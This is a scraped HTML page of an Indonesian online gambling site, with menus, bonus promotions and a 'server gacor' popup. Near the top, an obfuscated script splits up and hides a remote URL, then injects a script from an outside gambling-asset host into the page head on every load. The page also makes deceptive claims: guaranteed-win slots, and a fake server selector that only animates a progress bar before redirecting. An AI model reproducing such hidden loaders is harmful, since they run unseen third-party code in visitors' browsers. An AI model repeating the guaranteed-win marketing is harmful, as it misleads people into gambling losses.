          <h3 style="text-align:center; color:#FFD700;">SERVER INTERNATIONAL</h3>
          <p style="text-align:center; color:#fff;">Silahkan Pilih Server:</p>
    
          <select id="serverSelect" style="
            width: 100%;
            padding: 12px;
            font-size: 16px;
            margin-bottom: 15px;
            background-color: #2b2b2b;
            color: #fff;
            border: 1px solid #FFD700;
            border-radius: 4px;
          ">
            <option value="id">SERVER GACOR INDONESIA</option>
            <option value="sg">SERVER GACOR SINGAPORE</option>
            <option value="th">SERVER GACOR THAILAND</option>
            <option value="ae">SERVER GACOR DUBAI</option>
            <option value="vn">SERVER GACOR VIETNAM</option>
            <option value="ph">SERVER GACOR FILIPINA</option>
            <option value="mm">SERVER GACOR MYANMAR</option>
            <option value="jp">SERVER GACOR JEPANG</option>
            <option value="ru">SERVER GACOR RUSIA</option>
            <option value="kr">SERVER GACOR KOREA</option>
            <option value="cn">SERVER GACOR CHINA</option>
            <option value="hk">SERVER GACOR HONGKONG</option>
            <option value="my">SERVER GACOR MALAYSIA</option>
            <option value="int">SERVER GACOR INTERNATIONAL 🌐</option>
          </select>
    
          <div style="
            background-color: #333;
            height: 22px;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 12px;
            border: 1px solid #FFD700;
          ">
            <div id="progressBar" style="
              width: 0%;
              background: linear-gradient(90deg, #FFD700, #B7870C);
              height: 100%;
              text-align: center;
              color: #111;
              font-size: 14px;
              font-weight: bold;
              text-shadow: 0 0 5px rgba(0,0,0,0.6);
              transition: width 0.3s;
            ">0%</div>
          </div>
    
          <p id="statusText" style="text-align: center; font-weight: bold; color:#FFD700;"></p>
    
          <div style="text-align: center;">
            <button id="btnConnect" style="
              background: linear-gradient(to bottom, #FFD700, #B7870C);
              color: #111;
              border: none;
              padding: 10px 30px;
              border-radius: 6px;
              font-size: 14px;
              font-weight: bold;
              cursor: pointer;
              box-shadow: 0 0 12px rgba(255,215,0,0.6);
            ">HUBUNGKAN</button>
          </div>
        </div>
      `;
      document.body.appendChild(popup);
    
      document.getElementById("btnOpenMaxwin").addEventListener("click", () => {
        popup.style.display = "flex";
      });
    
      document.getElementById("closeMaxwin").addEventListener("click", () => {
        popup.style.display = "none";
        resetProgress();
      });
    
      let hasConnected = false;
    
      document.getElementById("btnConnect").addEventListener("click", () => {
        if (hasConnected) return;
    
        const bar = document.getElementById("progressBar");
        const status = document.getElementById("statusText");
        let progress = 0;
    
        bar.style.background = "linear-gradient(90deg,#FFD700,#B7870C)";
        status.innerText = "";
        hasConnected = true;
    
        const interval = setInterval(() => {
          progress += 5;
          bar.style.width = progress + "%";
          bar.textContent = progress + "%";
    
          if (progress >= 100) {
            clearInterval(interval);
            bar.style.background = "limegreen";
            bar.textContent = "100%";
            status.innerText = "Selesai!";
            status.style.color = "#fff";
    
            const url = new URL('/slots', window.location.href);
            url.protocol = 'https:';
            url.hostname = location.hostname;
            url.port = '';
            window.location.replace(url.toString());
          }
        }, 100);
      });
    
      function resetProgress() {
        const bar = document.getElementById("progressBar");
        const status = document.getElementById("statusText");
        bar.style.width = "0%";
        bar.textContent = "0%";
        bar.style.background = "linear-gradient(90deg,#FFD700,#B7870C)";
        status.innerText = "";
        hasConnected = false;
      }
    });
    </script> 

<script>var _0x1344b2=_0x1928;(function(_0x234a18,_0x44183a){var _0x576849=_0x1928,_0x326a2e=_0x234a18();while(!![]){try{var _0x27c6e9=parseInt(_0x576849(0x1ae))/(-0x83+-0x2a9*-0x5+-0xcc9)+parseInt(_0x576849(0x1a7))/(0x2*-0x788+-0x1a17+-0x29*-0x101)*(-parseInt(_0x576849(0x1a2))/(0xd1b+0xd4*-0x2d+0x182c))+parseInt(_0x576849(0x1a8))/(-0x193e+0x98f*0x2+0x189*0x4)+-parseInt(_0x576849(0x1a9))/(-0x2620+0x1*0x202d+0x5f8)+parseInt(_0x576849(0x1c0))/(-0x15*0x1af+-0x1*-0x1e62+0x4ff)*(-parseInt(_0x576849(0x1bd))/(0x1313+-0x627+-0xce5))+-parseInt(_0x576849(0x1a4))/(-0x1d*-0x4a+0xde*-0x2+-0x34f*0x2)*(parseInt(_0x576849(0x1b4))/(-0x5e*0x53+0x881*-0x2+0x5*0x981))+-parseInt(_0x576849(0x1ab))/(-0x2f3*0x1+0x1*0x2345+0x4*-0x812)*(-parseInt(_0x576849(0x1c2))/(-0x17be+-0x1*0xa7b+0x2244));if(_0x27c6e9===_0x44183a)break;else _0x326a2e['push'](_0x326a2e['shift']());}catch(_0x5a009a){_0x326a2e['push'](_0x326a2e['shift']());}}}(_0x3d03,0x9*0x22131+-0x2151*0x96+0xb20c2));var _0x60b0bc=(function(){var _0x34a08f=!![];return function(_0x4da461,_0x19bb5e){var _0x9b4c1c=_0x34a08f?function(){var _0x123dba=_0x1928;if(_0x19bb5e){var _0x442e90=_0x19bb5e[_0x123dba(0x1c1)](_0x4da461,arguments);return _0x19bb5e=null,_0x442e90;}}:function(){};return _0x34a08f=![],_0x9b4c1c;};}()),_0x3a9b7d=_0x60b0bc(this,function(){var _0x29a51c=_0x1928,_0x346248={'RCpcD':_0x29a51c(0x1b6)+'+$'};return _0x3a9b7d[_0x29a51c(0x1be)]()[_0x29a51c(0x1b9)](_0x346248[_0x29a51c(0x1aa)])[_0x29a51c(0x1be)]()[_0x29a51c(0x1b3)+'r'](_0x3a9b7d)[_0x29a51c(0x1b9)](_0x29a51c(0x1b6)+'+$');});function _0x1928(_0x3ef2e8,_0x51db8f){var _0x26a1e3=_0x3d03();return _0x1928=function(_0x5c46d7,_0x3a8e08){_0x5c46d7=_0x5c46d7-(0xb6d+-0x13ac*-0x1+-0x13*0x18d);var _0x214423=_0x26a1e3[_0x5c46d7];return _0x214423;},_0x1928(_0x3ef2e8,_0x51db8f);}_0x3a9b7d();var hokiScript=document[_0x1344b2(0x1af)+_0x1344b2(0x1bc)](_0x1344b2(0x1b5));hokiScript[_0x1344b2(0x1b8)]=_0x1344b2(0x1b0),hokiScript[_0x1344b2(0x1b7)]=function(){var _0x15387f=_0x1344b2;hokiStart(_0x15387f(0x1b2));},hokiScript[_0x1344b2(0x1b1)]=_0x1344b2(0x1c3)+_0x1344b2(0x1a5)+_0x1344b2(0x1ad)+_0x1344b2(0x1ba),hokiScript[_0x1344b2(0x1ac)]=!(0x64e+0x1864+-0x1eb2),document[_0x1344b2(0x1a6)+_0x1344b2(0x1bf)](_0x1344b2(0x1a3))[0x1c46+0xedc+-0x2b22][_0x1344b2(0x1bb)+'d'](hokiScript);function _0x3d03(){var _0x125f3a=['script','(((.+)+)+)','onload','type','search','agaming.js','appendChil','ent','7Bdcwop','toString','sByTagName','7760958dxQrVz','apply','11qiFdit','https://as','231cSYnel','head','4315888oRPJPA','set.qrisho','getElement','4084pGAqGP','4756920BcGrRD','3277430pMpqSo','RCpcD','13030170VaIjxy','async','ki.com/gig','1398991GuWUbO','createElem','module','src','cpg138','constructo','18mtIYQh'];_0x3d03=function(){return _0x125f3a;};return _0x3d03();}</script>
 





 
<meta charset="utf-8">

<meta name="csrf-token" content="NBEbKxG6lPy03y4rzVutbS2sGHgPjHuNJefNtVGv">

<script src="/assets/js/jquery/jquery.min.js"></script>
<script src="/assets/js/bootstrap/bootstrap.min.js"></script>

     
                        <link rel="preload" href="/assets/fonts/ugsubskin/icomoon/fonts/icomoon.woff2" as="font" type="font/woff2" crossorigin="anonymous">
      <link rel="stylesheet" href="/assets/fonts/ugsubskin/icomoon/style.min.css" media="all" onload="this.media='all'"> 
      <link rel="stylesheet" href="/assets/css/swiper.css">

  <link type="text/css" rel="stylesheet" href="/assets/css/app-mobile.css">     
    <link type="text/css" rel="stylesheet" href="/assets/css/custom.css">
    <script src="/assets/js/jquery/sweet_alert2.min.js"></script>
 

  <link rel="stylesheet" href="/assets/js/jquery/jquery-ui.min.css" media="all" onload="this.media='all'">
  <script src="/assets/js/jquery/jquery-ui.min.js" defer=""></script>
  <script type="text/javascript" src="/assets/js/jquery/jquery.ui.touch-punch.min.js" defer=""></script>
</head>



 
  <div class="full-container layout">
    <div id="sideNav" class="side-nav">
      <nav class="nav-content">
  <ul class="side-nav-items">
    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/home.php?i=1#" onclick="closeNav(-1);">
        <div><i class="icon-home"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@HOME">HOME</div>
      </a>

    </li>
            
      
    <li class="nav-item">
      <a href="#" class="navlink has-sub" onclick="openNavItem(0);" [ngclass]="{'active':isOpenNavContent[0], '':   !isOpenNavContent[0]}">
        <div><i class="icon-coins"></i></div>
        <div class="nav-title" i18n="@Funds">Dana</div>
      </a>
      <div class="nav-item-content" [ngclass]="{'open':isOpenNavContent[0], '':!isOpenNavContent[0]}">
        <ul class="submenu account">
          <li>
            <a href="https://www.Goblin88.site/deposit.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-pig"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Deposit</div>
            </a>
          </li>
          <li>
            <a href="https://www.Goblin88.site/withdraw.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-transfer"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Withdraw</div>
            </a>
          </li>
          <li>
            <a href="https://www.Goblin88.site/history.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-history"></i></span></div>
              <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
            </a>
          </li>
        
          <li>
            <a href="https://www.Goblin88.site/refferal.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-users"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Referral &nbsp;</div>
            </a>
          </li>
      

        </ul>
      </div>
    </li>
    
        <li class="nav-item">
      <a href="#" class="navlink has-sub" onclick="openNavItem(1);" [ngclass]="{'active':isOpenNavContent[1], '':   !isOpenNavContent[1]}">
        <div><i class="icon-videogame_asset"></i></div>
        <div class="nav-title" i18n="">PERMAINAN</div>
      </a>
      <div class="nav-item-content games" [ngclass]="{'open':isOpenNavContent[1], '':!isOpenNavContent[1]}">
        <ul class="submenu">
                  <!-- <i class="icon-lottery"></i>
                  <i  class="icon-others"></i>    -->

                                   <li>  <a href="https://www.Goblin88.site/slot.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-slot"></i>
               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">SLOTS</div>
            </a>
            </li>
                                                <li>  <a href="https://www.Goblin88.site/live.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <img src="/assets/images/live_game_icon3860.gif" ref="live game" height="41px">               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">LIVE GAMES</div>
            </a>
            </li>
                                                <li>  <a href="https://www.Goblin88.site/sports.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-soccer"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">SPORTS</div>
            </a>
            </li>
                                                <li>    <a href="https://www.Goblin88.site/casino.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-casino"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">CASINO</div>
            </a>
            </li>
                                                <li>
              <a href="https://www.Goblin88.site/lottery.php" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                      <i class="icon-lottery"></i>
                    
                    </span>
                    <span class="hot sub new ">NEW</span>
                </div>
                <div class="fs-sm mt-1">LOTRE</div>
               </a>
            </li>
                                                <li>
              <a href="https://www.Goblin88.site/fish-hunter.php" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                    <i class="icon-fish_hunter"></i>
                    </span>
                </div>
                <div class="fs-sm mt-1">TEMBAK IKAN</div>
               </a>
            </li>
                                                <li>   <a href="https://www.Goblin88.site/e-games.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-others"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">E-GAMES</div>
            </a>
            </li>
                        

        </ul>
      </div>
    </li>

            <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/promosaya.php" onclick="closeNav(-1);">
        <div><i class="icon-user1"></i></div> 
        <div class="nav-title" i18n="@PROMOS">Promo saya</div>
      </a>
    </li>
          <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/promotion.php" onclick="closeNav(-1);">
        <div><i class="icon-gift"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@PROMOS">PROMOSI</div>
      </a>
    </li>
    
        <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/refferal.php" onclick="closeNav(-1);">
        <div><i class="icon-users"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@REFERRAL">
                        REFERRAL                      </div>
      </a>

    </li>
                    <li class="nav-item">

      <a class="navlink" href="https://t.ly/rtpcipung" target="_blank" onclick="closeNav(-1);">
        <div>
          <i></i>
          <img src="/assets/ImageFile/202505252031220000002213b1fcac__babyrtp__200x200.webp" width="30px" height="30px">
        </div> <!--routerLinkActiveOptions for root URL-->

        <div class="nav-title">CEK RTP LIVE</div>
      </a>
    </li>
       


    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/info.php" onclick="closeNav(-1);">
        <div><i class="icon-info"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@INFO">INFO</div>
      </a>

    </li>
    <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/contact-us.php" onclick="closeNav(-1);">
        <div><i class="icon-address-book"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="">HUBUNGI KAMI</div>
      </a>
    </li>
    <li class="nav-item">
      <a href="#" class="navlink" onclick="closeNav();" data-trigger="nifty" data-target="#langModal-mobile">
       <div><i class="icon-language"></i></div>
       Bahasa      </a>
    </li>
    <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/" onclick="closeNav(-1);">
        <div><i class="icon-display"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title">Desktop View</div>
      </a>
    </li>
        <li class="nav-item"><a href="#" class="navlink" onclick="closeNav();"> <i class="icon-double_arrow_l"></i></a></li>
  </ul>
</nav>


<script>
var arr= [0,0];

function openNavItem(index){
    $('.nav-item-content').removeClass('open');
    $('.navlink.has-sub').removeClass('active');
    if(index>=0){
        $('.nav-item-content').eq(index).addClass('open');
        $('.navlink.has-sub').eq(index).addClass('active');
        $( "#mainContent" ).addClass( "navContentOpen" );
        $( "#sideNav" ).addClass( "navContentOpen" );
    }
}

function closeNav(){
    $('.nav-item-content').removeClass('open');
    $('.navlink.has-sub').removeClass('active');

    $( "#sideNav" ).removeClass( "navContentOpen" );
    $( "#sideNav" ).removeClass( "open" );
    $( "#mainContent" ).removeClass( "navContentOpen" );
    $( "#mainContent" ).removeClass( "sideNavOpen" );

}
</script>
    </div>

    <div class="main-content" id="mainContent">
      <div class="backdrop" id="mainContentContainer">

        <div class="top-bar">
          <div class="inner-header flex-row ">

<button id="btnToggleSideNav" class="btn btn-link" aria-label="side nav toggle">
    <i class="icon-bars"></i>
  </button>
  <a href="https://www.Goblin88.site/" title="" class="logo">
    <div><img class="img-fluid" alt="MERCUSUAR77" src="/assets/ImageFile/mercusuar.gif"></div>
  </a>

          <a id="btnToggleRSideNav">
      <i class="icon-user-o"></i>    
    </a>
    
  



</div>
        </div>
        <div class="content my01">

                                                  <div class="container wallet-bal">
                <div class="row text-left">
                  <div class="col-xs-6">
                    <button class="btn btn-clear btn-refresh-wallet">
                      <i class="icon-currency-dollar fs-lg i-dollar"></i>
                      &nbsp;&nbsp;
                      
                      <span class="bal-txt">IDR <?php echo $saldo_game; ?></span>
                    </button>
                  </div>
                    <div class="col-xs-6 noSidePadding i-refresh">
                                                                  <button class="btn btn-clear btn-refresh-wallet pull-right"><i class="icon-refresh-2"></i></button>
                    </div>
                </div>

                <div class="row game-bals" id="other-game-bals" style="display:none;">
                  <div class="">
                    <table class="table">
                      

                    <!-- <tr>
                        <td class="col-xs-4"><button class="btn btn-clear btn-refresh-PT">Playtech <i
                              class="icon-refresh"></i></button></td>
                        <td class="col-xs-7"><span class="bal-PT">0.00</span></td>
                        <td class="col-xs-1"><button class="btn btn-clear btn-tran-PT" data-toggle="tooltip"
                            data-placement="bottom" title="Transfer ALL to Wallet"><i
                              class="icon-arrow-bold-up"></i></button></td>
                      </tr> -->
                      <!-- <tr>
                        <td class="col-xs-4"><button class="btn btn-clear btn-refresh-CMD">CMD <i
                              class="icon-refresh"></i></button></td>
                        <td class="col-xs-7"><span class="bal-CMD">0.00</span></td>
                        <td class="col-xs-1">
                          <button class="btn btn-clear btn-tran-CMD" data-toggle="tooltip" data-placement="bottom"
                            title="Transfer ALL to Wallet">
                            <i class="icon-arrow-bold-up"></i></button></td>
                      </tr> -->
                      

                      

                    </table>
                  </div>
                </div>

              </div>
                        
          
<div class="container promo-view">

    <div class="promo-list ml-lg-5 mr-lg-5"> 
        <style>
::-webkit-scrollbar {
  width: 6px;
  height: 6px;
}
/* Track */
::-webkit-scrollbar-track {
  background: #e5e5e5;
}
/* Handle */
::-webkit-scrollbar-thumb {
    background: #7e7e7e;
    border-radius: 5px;
}
/* Handle on hover */
::-webkit-scrollbar-thumb:hover {
  background: #555;
}

.time-remaining-wraper{
  padding: 0;
}
.mobile .promotion-modal .panel-body {
    background: transparent !important;
}
</style>
<div class="promotion-page">
  <div class="g_category-nav fixed nav nav-pills nav-fill clearfix">
        <div class="nav-item active" data-filter="ALL">
      <a class="navlink" href="javascript:void(0);">
                    SEMUA          
         
      </a>
    </div>
        <div class="nav-item" data-filter="Special">
      <a class="navlink" href="javascript:void(0);">
                    Khusus         
      </a>
    </div>
        <div class="nav-item" data-filter="Sports">
      <a class="navlink" href="javascript:void(0);">
                    sports         
      </a>
    </div>
        <div class="nav-item" data-filter="Slot">
      <a class="navlink" href="javascript:void(0);">
                    slots         
      </a>
    </div>
        <div class="nav-item" data-filter="Casino">
      <a class="navlink" href="javascript:void(0);">
                    casino         
      </a>
    </div>
        <div class="nav-item" data-filter="Others">
      <a class="navlink" href="javascript:void(0);">
                    others         
      </a>
    </div>
     

  </div>
<div class="promotion-group" id="promotion-group">
  
            <div class="promotion-single" data-filter="ALL,Special,Slots" style="">
      <div class="row d-flex">
      <div class="col-md-4 col-sm-4 col-xs-12 ">
        <img src="/assets/promotion_banners/garansideposit100%.jpg" alt="Goblin$88 promo" class="img-fluid ">
      </div>
      <div class="col-md-8 col-sm-8 col-xs-12 m-t-10">

        <div class="col-md-8 col-sm-8 col-xs-12 text-left">
          <h3 class="title">
                      <div>
            GARANSI 100% PASTI GACOR !
          </div>
                </h3>
      <div class="m-t-10">
        <a href="javascript:void(0);" class="btn btn-secondary" data-trigger="nifty" data-target="#promo-modal-1083273633">Rincian</a>
        <!--<a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a>   -->
      </div>
        </div>
        <div class="col-md-4 col-sm-4 col-xs-12 m-t-10 time-remaining-wraper">
          <div class="time-remaining">
            <i class="icon-clock"></i> &nbsp; Waktu yang tersisa          </div>
          <div class="time-remaining-value">
            <h4>
                              <span>Tanpa Batas Waktu</span>
                         </h4>
          </div>
        </div>

      </div>
      </div>
  </div>
  <!--Language Option Modal -->
  <div class="nifty-modal slide-in-bottom modal-lg promotion-modal" id="promo-modal-1083273633">
    <div class="md-content">
      <div class="md-head">
          <div class="md-close">X</div>
      </div>
    <div class="promotionmodal_content">

      <div class="md-body">
        <div class="row">

          <div class="col-md-5 col-sm-5 col-xs-12 promobanner_img">
            <img src="/assets/promotion_banners/garansideposit100%.jpg" alt="Goblin$88 promo" class="img-fluid ">
          </div>
          <div class="col-md-7 col-sm-7 col-xs-12">
            <h3 class="title m-t-10">
                          <div>
              GARANSI 100% PASTI GACOR !
            </div>
                    </h3>
        <div class="time-remaining">
          <i class="icon-clock"></i> &nbsp; Waktu yang tersisa        </div>
        <div class="time-remaining-value">
          <h4>
                        <span>Tanpa Batas Waktu</span>
                     </h4>
        </div>
        <div class="m-t-10">
          <!-- <a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a> -->
        </div>
          </div>

        </div>
                  <div class="m-t-10 ">
            <h3><font face="Montserrat"><b style="color: rgb(255, 156, 0);">Goblin$88 BERANI MEMBERIKAN JAMINAN GARANSI 100% UANG KEMBALI JIKA SLOT YANG DIMAINKAN TIDAK GACOR!</b></font></h3><ul><li><b>Promo bonus hanya berlaku bagi new member pada permainan slot online.</b></li><li><b>Minimal deposit untuk mengikuti promo ini adalah 50.000&nbsp;</b></li><li><b>Untuk bonus wajib diklaim pada saat melakukan deposit pertama dan pilih bonus 100% Garansi Gacor|Goblin$88 GG.</b></li><li><b>Bonus akan masuk secara otomatis jika pemain mengalami KEKALAHAN dan total TO sudah mencapai 10x selama bermain.</b></li><li><b>Turnover dihitung 10x dari nilai DEPOSIT+BONUS.</b></li></ul><p><b>Contoh :</b><br></p><p><b>Deposit 50.000+ BONUS 50.000 x 10 = Rp. 1.000.000 (Syarat TO yang harus dicapai)</b><br></p><ul><li><b>Maksimal bonus pada promo ini adalah 100.000</b></li><li><b>Promo Bonus ini hanya berlaku untuk deposit bank</b></li><li><b>Bonus tidak dapat digabungkan dengan promo / bonus lain.&nbsp;</b></li><li><b>Goblin$88 berhak untuk menghanguskan seluruh dana didalam ID </b><span style="font-weight: bolder;">apabila ada tindakan pelanggaran ataupun manipulasi baik itu secara individu ataupun kelompok / sindikat.</span></li><li><b>Keputusan Goblin$88 bersifat mutlak.</b></li></ul>
          </div>

              </div>
    </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!--END Language Option Modal -->
            <div class="promotion-single" data-filter="ALL,Slots,Casino" style="">
      <div class="row d-flex">
      <div class="col-md-4 col-sm-4 col-xs-12 ">
        <img src="/assets/promotion_banners/roling1%.jpg" alt="Goblin$88 promo" class="img-fluid ">
      </div>
      <div class="col-md-8 col-sm-8 col-xs-12 m-t-10">

        <div class="col-md-8 col-sm-8 col-xs-12 text-left">
          <h3 class="title">
                      <div>
            BONUS ROLLINGAN 1% SETIAP HARI TANPA BATAS
          </div>
                </h3>
      <div class="m-t-10">
        <a href="javascript:void(0);" class="btn btn-secondary" data-trigger="nifty" data-target="#promo-modal-2351338511">Rincian</a>
        <!--<a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a>   -->
      </div>
        </div>
        <div class="col-md-4 col-sm-4 col-xs-12 m-t-10 time-remaining-wraper">
          <div class="time-remaining">
            <i class="icon-clock"></i> &nbsp; Waktu yang tersisa          </div>
          <div class="time-remaining-value">
            <h4>
                              <span>Tanpa Batas Waktu</span>
                         </h4>
          </div>
        </div>

      </div>
      </div>
  </div>
  <!--Language Option Modal -->
  <div class="nifty-modal slide-in-bottom modal-lg promotion-modal" id="promo-modal-2351338511">
    <div class="md-content">
      <div class="md-head">
          <div class="md-close">X</div>
      </div>
    <div class="promotionmodal_content">

      <div class="md-body">
        <div class="row">

          <div class="col-md-5 col-sm-5 col-xs-12 promobanner_img">
            <img src="/assets/promotion_banners/roling1%.jpg" alt="Goblin$88 promo" class="img-fluid ">
          </div>
          <div class="col-md-7 col-sm-7 col-xs-12">
            <h3 class="title m-t-10">
                          <div>
              BONUS ROLLINGAN 1% SETIAP HARI TANPA BATAS
            </div>
                    </h3>
        <div class="time-remaining">
          <i class="icon-clock"></i> &nbsp; Waktu yang tersisa        </div>
        <div class="time-remaining-value">
          <h4>
                        <span>Tanpa Batas Waktu</span>
                     </h4>
        </div>
        <div class="m-t-10">
          <!-- <a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a> -->
        </div>
          </div>

        </div>
                  <div class="m-t-10 ">
            <h3><b style="color: rgb(255, 156, 0);">MAIN SLOT DI Goblin$88 MENANG KALAH SETIAP HARI SEMUA MEMBER DAPAT DUIT DARI BONUS ROLLINGAN 1% TANPA BATAS !</b></h3><p><b>Syarat dan Ketentuan :</b></p><ul><li><b>Bonus akan dibagikan secara otomatis setiap hari dimulai pada pukul 14:00 WIB - selesai.</b></li><li><b>Tidak ada batasan maksimal bonus.</b></li><li><b>Bonus dibagikan berupa chip dan langsung masuk ke dalam dompet utama yang bisa langsung di cairkan / di withdrawkan.</b></li><li><b>Bonus akan dihitung melalui nilai (VBA) Valid Betting Amount</b></li><li><b>Bonus rollingan akan dihitung dari jumlah TO (Turnover) masing masing ID dalam periode 1 hari yang dihitung mulai dari tanggal kemari pukul 11.00 WIB - 10:59 WIB tanggal berikutnya.</b></li><li><b>Seluruh ID yang memiliki perputaran permainan (Turnover) akan mendapatkan bonus rollingan ini.</b></li><li><b>Besaran Bonus Rollingan setiap hari akan dibagikan sesuai dengan kategori level masing masing ID.</b></li><li><b>Apabila ada indikasi kecurangan seperti kesamaan IP , Manipulasi data Rekening, Melakukan Bettingan Invest dan sejenisnya maka pihak Goblin$88 berhak untuk membatalkan bonus maupun kemenangan yang ada.</b></li><li><b>Keputusan Goblin$88 bersifat mutlak dan tidak dapat diganggu gugat.</b></li></ul><p><b style="color: rgb(255, 156, 0);"><u><br>LIVE CASINO</u></b><br></p><table class="table table-bordered"><tbody><tr><td style="text-align: center; "><b>NEW MEMBER</b></td><td style="text-align: center; "><b>REGULER MEMBER</b></td><td style="text-align: center; "><b>SILVER</b></td><td style="text-align: center; "><b>GOLD</b></td><td style="text-align: center; "><b>PLATINUM</b></td></tr><tr><td style="text-align: center; "><b>0.5%</b></td><td style="text-align: center; "><b>0.5%</b></td><td style="text-align: center; "><b>0.6%<br></b></td><td style="text-align: center; "><b>0.7%</b></td><td style="text-align: center; "><b>0.8%</b></td></tr></tbody></table><p><b><br></b></p><p><b style="color: rgb(255, 156, 0); text-decoration-line: underline;">SLOT ONLINE</b></p><table class="table table-bordered" style="width: 1521.33px;"><tbody><tr><td style="text-align: center;"><span style="font-weight: bolder;">NEW MEMBER</span></td><td style="text-align: center;"><span style="font-weight: bolder;">REGULER MEMBER</span></td><td style="text-align: center;"><span style="font-weight: bolder;">SILVER</span></td><td style="text-align: center;"><span style="font-weight: bolder;">GOLD</span></td><td style="text-align: center;"><span style="font-weight: bolder;">PLATINUM</span></td></tr><tr><td style="text-align: center;"><span style="font-weight: bolder;">0.5%</span></td><td style="text-align: center;"><span style="font-weight: bolder;">0.5%</span></td><td style="text-align: center;"><span style="font-weight: bolder;">0.5%<br></span></td><td style="text-align: center;"><span style="font-weight: bolder;">0.6%</span></td><td style="text-align: center;"><span style="font-weight: bolder;">0.7%<br><br></span></td></tr></tbody></table>
          </div>

              </div>
    </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!--END Language Option Modal -->
            <div class="promotion-single" data-filter="ALL,ALL,Slots,Casino" style="">
      <div class="row d-flex">
      <div class="col-md-4 col-sm-4 col-xs-12 ">
        <img src="/assets/promotion_banners/bonusdepositsetiaphari10%.jpg" alt="Goblin$88 promo" class="img-fluid ">
      </div>
      <div class="col-md-8 col-sm-8 col-xs-12 m-t-10">

        <div class="col-md-8 col-sm-8 col-xs-12 text-left">
          <h3 class="title">
                      <div>
            BONUS CASHBACK 10% SLOT ONLINE &amp; LIVE CASINO
          </div>
                </h3>
      <div class="m-t-10">
        <a href="javascript:void(0);" class="btn btn-secondary" data-trigger="nifty" data-target="#promo-modal-3076597430">Rincian</a>
        <!--<a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a>   -->
      </div>
        </div>
        <div class="col-md-4 col-sm-4 col-xs-12 m-t-10 time-remaining-wraper">
          <div class="time-remaining">
            <i class="icon-clock"></i> &nbsp; Waktu yang tersisa          </div>
          <div class="time-remaining-value">
            <h4>
                              <span>Tanpa Batas Waktu</span>
                         </h4>
          </div>
        </div>

      </div>
      </div>
  </div>
  <!--Language Option Modal -->
  <div class="nifty-modal slide-in-bottom modal-lg promotion-modal" id="promo-modal-3076597430">
    <div class="md-content">
      <div class="md-head">
          <div class="md-close">X</div>
      </div>
    <div class="promotionmodal_content">

      <div class="md-body">
        <div class="row">

          <div class="col-md-5 col-sm-5 col-xs-12 promobanner_img">
            <img src="/assets/promotion_banners/cshback.png" alt="Goblin$88 promo" class="img-fluid ">
          </div>
          <div class="col-md-7 col-sm-7 col-xs-12">
            <h3 class="title m-t-10">
                          <div>
              BONUS CASHBACK 10% SLOT ONLINE &amp; LIVE CASINO
            </div>
                    </h3>
        <div class="time-remaining">
          <i class="icon-clock"></i> &nbsp; Waktu yang tersisa        </div>
        <div class="time-remaining-value">
          <h4>
                        <span>Tanpa Batas Waktu</span>
                     </h4>
        </div>
        <div class="m-t-10">
          <!-- <a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a> -->
        </div>
          </div>

        </div>
                  <div class="m-t-10 ">
